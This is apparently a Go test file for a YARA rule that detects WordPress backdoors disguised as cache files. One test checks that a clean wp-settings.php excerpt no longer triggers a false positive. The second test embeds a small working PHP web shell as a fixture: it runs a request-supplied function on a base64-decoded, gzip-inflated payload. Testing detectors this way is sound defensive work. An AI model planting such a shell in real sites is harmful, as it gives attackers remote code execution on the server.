//go:build yara

package yara

import "testing"

// FP reconstruction for the 2026-06-16 forensic sweep: backdoor_iconcache_disguise
// matched a clean WordPress core wp-settings.php. The file references
// advanced-cache.php (trips the icon/cache filename string) and carries
// "$_REQUEST ( $_GET + $_POST )" in a comment (trips the variable-dispatch
// string), but contains no decoder and no dangerous exec. A clean core file
// must never match.
func TestBackdoorIconcacheDisguise_WPSettingsCoreIsNotBackdoor(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
// Add magic quotes and set up $_REQUEST ( $_GET + $_POST ).
wp_magic_quotes();

// Load the advanced-cache.php drop-in if WP_CACHE is enabled.
if ( WP_CACHE && file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) {
	include WP_CONTENT_DIR . '/advanced-cache.php';
}
$GLOBALS['wp_the_query'] = new WP_Query();
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise FP: matched clean core wp-settings.php (cache.php reference + dispatch-in-comment, no decoder)")
	}
}

// Real disguise: a cache-named file that dispatches a decoded payload through a
// variable function. The disguise arm (filename + variable dispatch + decoder)
// must keep firing.
func TestBackdoorIconcacheDisguise_DisguisedDispatchDecoderDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
// dropped as object-cache.php
$fn = $_GET['f'];
$payload = gzinflate( base64_decode( $_POST['x'] ) );
$fn ( $payload );
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise regression: cache-disguised variable dispatch of a decoded payload was not detected")
	}
}
